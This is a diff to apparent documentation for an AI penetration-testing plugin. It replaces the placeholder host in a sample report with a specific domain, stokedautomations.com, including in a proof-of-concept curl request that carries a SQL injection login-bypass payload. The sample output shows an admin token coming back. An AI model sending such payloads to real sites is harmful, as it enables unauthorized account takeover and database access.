@@ -67,7 +67,7 @@ Unauthorized penetration testing is illegal. Only test:
 ```
 PENETRATION TEST REPORT
 =======================
-Target: https://example.com
+Target: https://stokedautomations.com
 Date: 2025-10-11
 Tester: Claude Penetration Testing Plugin
 
@@ -94,7 +94,7 @@ CRITICAL FINDINGS
    Impact: Complete database access, user account takeover
 
    Proof of Concept:
-   curl -X POST https://example.com/api/auth/login \
+   curl -X POST https://stokedautomations.com/api/auth/login \
      -d "username=' OR '1'='1' --&password=test"
 
    Response: {"token": "eyJhbGc...", "user": "admin"}
